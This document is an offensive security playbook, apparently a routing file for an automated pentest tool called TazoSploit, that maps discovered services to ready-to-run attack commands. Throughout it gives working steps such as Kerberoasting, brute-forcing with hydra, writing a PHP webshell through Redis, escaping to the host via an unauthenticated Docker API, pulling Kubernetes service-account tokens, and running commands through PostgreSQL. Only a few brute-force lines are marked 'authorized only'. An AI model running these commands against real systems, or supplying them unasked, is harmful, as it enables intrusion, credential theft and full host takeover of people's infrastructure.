# Recon-to-Attack Routing Reference

## Purpose
Map reconnaissance findings to immediate next steps. Each entry includes:
1. **Discovery indicator** — exact service/port/banner pattern
2. **Skill to load** — which TazoSploit skill handles exploitation
3. **First 3 commands** — what to run immediately

---

## Web Application Frameworks

### WordPress Detected
**Indicators:** `wp-content` in HTML, `wp-login.php`, `X-Powered-By: PHP`, WPScan fingerprint, `/xmlrpc.php` responds 405
```bash
# 1. Enumerate users, plugins, themes
wpscan --url http://target --enumerate u,ap,at --api-token YOUR_TOKEN -o wpscan.json -f json

# 2. Check XML-RPC for brute-force and SSRF
curl -s -X POST http://target/xmlrpc.php \
  -d '<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName></methodCall>'

# 3. Enumerate vulnerable plugins specifically
wpscan --url http://target --enumerate vp --plugins-detection aggressive --api-token YOUR_TOKEN
```
**Next:** Load wordpress/web-exploit skill → check plugin CVEs → xmlrpc brute → wp-config.php disclosure

### Joomla Detected
**Indicators:** `/administrator/` login page, `Joomla!` in HTML generator meta, `/configuration.php`
```bash
# 1. Version and component enumeration
joomscan -u http://target -ec

# 2. Check configuration disclosure
curl -s http://target/configuration.php.bak
curl -s http://target/configuration.php~
curl -s http://target/configuration.php.swp

# 3. Enumerate admin users via registration
curl -s "http://target/index.php?option=com_users&view=registration"
```

### Drupal Detected
**Indicators:** `Drupal` in HTTP headers or HTML, `/user/login`, `/CHANGELOG.txt`, `sites/default/`
```bash
# 1. Version fingerprint
curl -s http://target/CHANGELOG.txt | head -5
droopescan scan drupal -u http://target

# 2. Check for Drupalgeddon (CVE-2018-7600, CVE-2019-6340)
curl -s "http://target/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax" \
  -d 'form_id=user_register_form&_drupal_ajax=1'

# 3. Enumerate users
for i in $(seq 0 20); do
  curl -s -o /dev/null -w "%{http_code} user/$i\n" "http://target/user/$i"
done
```

---

## CI/CD & DevOps

### Jenkins Detected
**Indicators:** Port 8080, `X-Jenkins` header, `/login?from=` page, Jenkins logo
```bash
# 1. Version and unauthenticated access
curl -sI http://target:8080/ | grep -i x-jenkins
curl -s http://target:8080/api/json?pretty=true

# 2. Check Script Console (RCE if accessible)
curl -s http://target:8080/script
curl -s http://target:8080/manage

# 3. Enumerate jobs and credentials
curl -s "http://target:8080/api/json?tree=jobs[name,url,lastBuild[result]]&pretty=true"
```
**Next:** Load cicd skill → Script Console RCE → credential extraction → build pipeline abuse

### GitLab Detected
**Indicators:** GitLab login page, `/users/sign_in`, `X-GitLab-*` headers
```bash
# 1. Version check (API)
curl -s http://target/api/v4/version
curl -s http://target/api/v4/metadata

# 2. Public repositories and snippets
curl -s "http://target/api/v4/projects?visibility=public&per_page=100" | jq '.[].web_url'
curl -s "http://target/api/v4/snippets?visibility=public" | jq '.[].web_url'

# 3. User enumeration
curl -s "http://target/api/v4/users?per_page=100" | jq '.[].username'
```
**Next:** CVE check (CVE-2021-22205 RCE, CVE-2023-7028 account takeover) → public repo secrets → CI token abuse

### Jira Detected
**Indicators:** `/secure/Dashboard.jspa`, Atlassian branding, `/rest/api/2/`
```bash
# 1. Unauthenticated dashboard access
curl -s "http://target/rest/api/2/serverInfo" | jq '{version, baseUrl}'

# 2. User and project enumeration
curl -s "http://target/rest/api/2/user/search?username=." | jq '.[].name'
curl -s "http://target/rest/api/2/project" | jq '.[].key'

# 3. Check for CVE-2019-11581 (SSTI) and other known vulns
curl -s "http://target/secure/ContactAdministrators!default.jspa"
```

---

## Active Directory / Windows

### Kerberos (Port 88)
**Indicators:** TCP 88 open, `Kerberos` in nmap service detection
```bash
# 1. AS-REP Roasting (no pre-auth users)
impacket-GetNPUsers target.local/ -dc-ip DC_IP -usersfile users.txt -format hashcat -outputfile asrep.hash

# 2. Kerberoasting (request TGS for SPNs)
impacket-GetUserSPNs target.local/user:password -dc-ip DC_IP -request -outputfile kerberoast.hash

# 3. Enumerate domain info
ldapsearch -x -H ldap://DC_IP -b "dc=target,dc=local" -s sub "(objectClass=user)" sAMAccountName
```
**Next:** Load AD skill → crack hashes (hashcat -m 18200 / -m 13100) → pass-the-hash → lateral movement

### LDAP (Port 389/636)
**Indicators:** TCP 389/636 open, LDAP banner
```bash
# 1. Anonymous bind check
ldapsearch -x -H ldap://target -b "" -s base namingContexts

# 2. Full domain enumeration
ldapsearch -x -H ldap://target -b "dc=target,dc=local" "(objectClass=*)" -s sub

# 3. Extract users and descriptions (often contain passwords)
ldapsearch -x -H ldap://target -b "dc=target,dc=local" "(objectClass=user)" sAMAccountName description memberOf
```

---

## File Sharing & Remote Access

### SMB (Port 445/139)
**Indicators:** TCP 445 open, SMB/Samba in nmap, NetBIOS on 139
```bash
# 1. Null session and share enumeration
smbclient -L //target -N
crackmapexec smb target -u '' -p '' --shares

# 2. Enumerate users via RID cycling
crackmapexec smb target -u '' -p '' --rid-brute 4000

# 3. Check for EternalBlue (MS17-010)
nmap -p 445 --script smb-vuln-ms17-010 target
```
**Next:** Load smb skill → mount readable shares → spider for credentials → psexec/wmiexec if creds found

### RDP (Port 3389)
**Indicators:** TCP 3389 open, ms-wbt-server in nmap
```bash
# 1. NLA check and screenshot
nmap -p 3389 --script rdp-enum-encryption,rdp-ntlm-info target

# 2. Check for BlueKeep (CVE-2019-0708)
nmap -p 3389 --script rdp-vuln-ms12-020 target

# 3. Brute-force (authorized only)
hydra -L users.txt -P passwords.txt rdp://target -t 4 -W 3
```

### FTP (Port 21)
**Indicators:** TCP 21 open, FTP banner
```bash
# 1. Anonymous login check
ftp target <<< $'anonymous\nanonymous@\nls\nbye'

# 2. Banner grab and version
nmap -p 21 -sV --script ftp-anon,ftp-bounce,ftp-vuln* target

# 3. Brute-force (authorized only)
hydra -L users.txt -P passwords.txt ftp://target -t 10
```

### SSH (Port 22)
**Indicators:** TCP 22 open, OpenSSH banner
```bash
# 1. Banner grab and auth methods
ssh -v target -o PreferredAuthentications=none 2>&1 | grep -i auth

# 2. User enumeration (CVE-2018-15473 for OpenSSH < 7.7)
python3 ssh_user_enum.py target -U users.txt

# 3. Brute-force (authorized only)
hydra -L users.txt -P passwords.txt ssh://target -t 4 -W 3
```

---

## Databases

### MSSQL (Port 1433)
**Indicators:** TCP 1433 open, Microsoft SQL Server banner
```bash
# 1. Instance enumeration and version
nmap -p 1433 --script ms-sql-info,ms-sql-ntlm-info target

# 2. Default credential check
crackmapexec mssql target -u sa -p '' --local-auth
crackmapexec mssql target -u sa -p 'sa' --local-auth

# 3. Command execution (if creds found)
impacket-mssqlclient sa:password@target -windows-auth
```
**Next:** Load database skill → xp_cmdshell enable → file read/write → domain escalation via linked servers

### MySQL (Port 3306)
**Indicators:** TCP 3306 open, MySQL banner
```bash
# 1. Remote root login check
mysql -h target -u root -p'' -e 'SELECT version();' 2>/dev/null

# 2. Brute-force common creds
hydra -L users.txt -P /usr/share/seclists/Passwords/Default-Credentials/mysql-betterdefaultpasslist.txt mysql://target

# 3. UDF command execution (if root access)
nmap -p 3306 --script mysql-info,mysql-enum,mysql-vuln-cve2012-2122 target
```

### PostgreSQL (Port 5432)
**Indicators:** TCP 5432 open, PostgreSQL banner
```bash
# 1. Default credential check
psql -h target -U postgres -c 'SELECT version();' 2>/dev/null

# 2. Enumeration
nmap -p 5432 --script pgsql-brute target

# 3. Command execution (if superuser)
psql -h target -U postgres -c "COPY (SELECT '') TO PROGRAM 'id';"
```

---

## NoSQL & Caching

### Redis (Port 6379)
**Indicators:** TCP 6379 open, redis banner
```bash
# 1. Unauthenticated access check
redis-cli -h target INFO server

# 2. Dump all keys
redis-cli -h target KEYS '*' | head -50

# 3. Write webshell or SSH key (if writable)
redis-cli -h target CONFIG SET dir /var/www/html/
redis-cli -h target CONFIG SET dbfilename shell.php
redis-cli -h target SET payload '<?php system($_GET["cmd"]); ?>'
redis-cli -h target SAVE
```
**Next:** Load nosql skill → dump data → write webshell → SSH key injection → crontab write

### MongoDB (Port 27017)
**Indicators:** TCP 27017 open, MongoDB banner
```bash
# 1. Unauthenticated access
mongosh --host target --eval 'db.adminCommand({listDatabases:1})'

# 2. Enumerate databases and collections
mongosh --host target --eval 'db.getMongo().getDBNames().forEach(function(d){print(d);db.getSiblingDB(d).getCollectionNames().forEach(function(c){print("  "+c)})})'

# 3. Dump sensitive collections
mongosh --host target --eval 'db.getSiblingDB("admin").system.users.find().pretty()'
```

---

## Container & Orchestration

### Docker API (Port 2375/2376)
**Indicators:** TCP 2375/2376 open, Docker API response
```bash
# 1. Check for unauthenticated API
curl -s http://target:2375/version | jq .
curl -s http://target:2375/containers/json | jq '.[].Names'

# 2. List images
curl -s http://target:2375/images/json | jq '.[].RepoTags'

# 3. Create privileged container (host escape)
curl -s -X POST http://target:2375/containers/create \
  -H 'Content-Type: application/json' \
  -d '{"Image":"alpine","Cmd":["/bin/sh"],"Binds":["/:/mnt"],"Privileged":true}'
```
**Next:** Container escape → mount host filesystem → read /etc/shadow → add SSH key → full host access

### Kubernetes API (Port 6443/8443/10250)
**Indicators:** TCP 6443/8443 open, kube-apiserver banner, `/api/v1` endpoint
```bash
# 1. Unauthenticated API check
curl -sk https://target:6443/api/v1/namespaces
curl -sk https://target:6443/version

# 2. Kubelet API (port 10250) — list pods
curl -sk https://target:10250/pods | jq '.items[].metadata.name'

# 3. Service account token extraction
curl -sk https://target:10250/run/default/POD_NAME/CONTAINER \
  -d 'cmd=cat /var/run/secrets/kubernetes.io/serviceaccount/token'
```
**Next:** Load k8s skill → service account abuse → secret extraction → cluster admin escalation

---

## Network Services

### SNMP (Port 161/UDP)
**Indicators:** UDP 161 open, SNMP banner
```bash
# 1. Community string brute-force
onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt target

# 2. Full device enumeration
snmpwalk -v2c -c public target 1.3.6.1.2.1 | tee snmpwalk.txt

# 3. Extract specific MIBs (users, interfaces, routes)
snmpwalk -v2c -c public target 1.3.6.1.4.1.77.1.2.25    # Windows users
snmpwalk -v2c -c public target 1.3.6.1.2.1.25.4.2.1.2    # Running processes
```
**Next:** Extract usernames → routing tables → network topology → use for lateral movement

### SMTP (Port 25)
**Indicators:** TCP 25 open, SMTP banner
```bash
# 1. User enumeration via VRFY/EXPN
smtp-user-enum -M VRFY -U users.txt -t target
smtp-user-enum -M RCPT -U users.txt -D target.com -t target

# 2. Open relay check
nmap -p 25 --script smtp-open-relay target
swaks --to test@example.com --from test@target.com --server target

# 3. NTLM info disclosure
nmap -p 25 --script smtp-ntlm-info target
```

### IMAP/POP3 (Port 110/143/993/995)
**Indicators:** TCP 110/143 open, IMAP/POP3 banner
```bash
# 1. Banner and capability enumeration
nmap -p 110,143,993,995 -sV --script imap-capabilities,pop3-capabilities target

# 2. Brute-force (authorized only)
hydra -L users.txt -P passwords.txt imap://target -t 4
hydra -L users.txt -P passwords.txt pop3://target -t 4

# 3. Read emails (if creds obtained)
curl -s "imaps://target/INBOX" --user "user:password" -k
```

### NFS (Port 2049)
**Indicators:** TCP 2049 open, nfs/rpcbind banner
```bash
# 1. Show exported shares
showmount -e target

# 2. Mount accessible shares
mkdir /tmp/nfs_mount && mount -t nfs target:/share /tmp/nfs_mount

# 3. Look for sensitive files
find /tmp/nfs_mount -name '*.conf' -o -name '*.bak' -o -name 'id_rsa' -o -name '.bash_history'
```

---

## Routing Priority Table

| Port/Service        | Skill to Load   | Urgency  |
| ------------------- | ---------------- | -------- |
| 88 (Kerberos)       | AD/kerberos      | HIGH     |
| 445 (SMB)           | smb              | HIGH     |
| 2375 (Docker API)   | container-escape | CRITICAL |
| 6443 (K8s API)      | kubernetes       | CRITICAL |
| 6379 (Redis)        | nosql            | HIGH     |
| 27017 (MongoDB)     | nosql            | HIGH     |
| 1433 (MSSQL)        | database         | HIGH     |
| 3306 (MySQL)        | database         | MEDIUM   |
| 8080 (Jenkins)      | cicd             | HIGH     |
| 80/443 (WordPress)  | wordpress        | MEDIUM   |
| 25 (SMTP)           | email-enum       | MEDIUM   |
| 161/UDP (SNMP)      | network-enum     | MEDIUM   |
| 21 (FTP anon)       | file-access      | MEDIUM   |
| 2049 (NFS)          | file-access      | MEDIUM   |
